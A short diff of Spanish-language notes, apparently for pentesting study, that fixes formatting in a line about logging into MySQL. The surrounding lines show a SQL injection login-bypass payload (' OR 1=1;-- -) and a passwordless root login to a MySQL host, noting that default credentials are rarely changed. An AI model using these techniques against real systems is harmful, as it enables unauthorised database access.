@@ -4,7 +4,7 @@ Propietario: Adrian Gisbert Cabello
 
 Para hacer una inyección simple de MySQL en el usuario pondremos lo siguiente: `' OR 1=1;-- -`		y ponemos la contraseña que queramos.
 
-Para entrar mediante el protocolo MySQL: `mysql -u USUARIO -p -h 192.168.X.X` ******→ usuario ***por defecto suele ser root***, no suelen cambiar credenciales por defecto. `mysql -u root -h 192.168.X.X`
+Para entrar mediante el protocolo MySQL: `mysql -u USUARIO -p -h 192.168.X.X` → usuario ***por defecto suele ser root***, no suelen cambiar credenciales por defecto. `mysql -u root -h 192.168.X.X`
 
 Comandos para usar dentro de MySQL:
 
